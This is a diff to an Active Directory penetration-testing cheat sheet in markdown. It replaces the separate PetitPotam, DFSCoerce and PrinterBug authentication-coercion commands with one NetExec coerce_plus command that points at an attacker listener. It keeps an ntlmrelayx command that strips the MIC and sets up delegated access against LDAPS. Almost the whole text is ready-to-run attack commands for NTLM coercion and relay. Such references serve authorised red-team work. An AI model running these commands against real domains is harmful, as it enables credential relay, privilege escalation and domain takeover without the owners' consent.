@@ -502,7 +502,7 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
   <summary> NTLMv1-relay </summary>   
 
   ### NTLMRelayx delegate access if NTLMv1 is enabled
-  #### Authentication can be forced via PetitPotam, DFSCoerce or PrinterBug, check if the answer is in NTLMv1
+  #### Authentication can be forced via NetExec's coerce_plus Module, check if the answer is in NTLMv1
   ```shell
   sudo python3 ntlmrelayx.py -t ldaps://<target> --remove-mic -smb2support --delegate-access
   ```
@@ -512,30 +512,16 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
 <details>
   <summary> PetitPotam </summary> 
   
-  ### Force NTLM authentication
+  ### NetExec Coerce Authentication
   ```shell
-  python3 PetitPotam.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
+  NetExec smb <target> -u <AD_user> -p <AD_password> -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true
   ```
+  ### Methods
+  * PetitPotam
+  * printerbug
+  * dfscoerce
 </details> 
   
-<details>
-  <summary> DFSCoerce </summary> 
-  
-  ### Force NTLM authentication
-  ```shell
-  python3 dfscoerce.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
-  ```
-</details> 
-
-<details>
-  <summary> PrinterBug </summary> 
-  
-  ### Force NTLM authentication
-  ```shell
-  python3 printerbug.py '<Domain_Name>'/'<AD_user>':'<AD_password>'@'<target_IP>' <attacker_IP> 
-  ```
-</details>
-
 # Password Spraying
 
 <details>
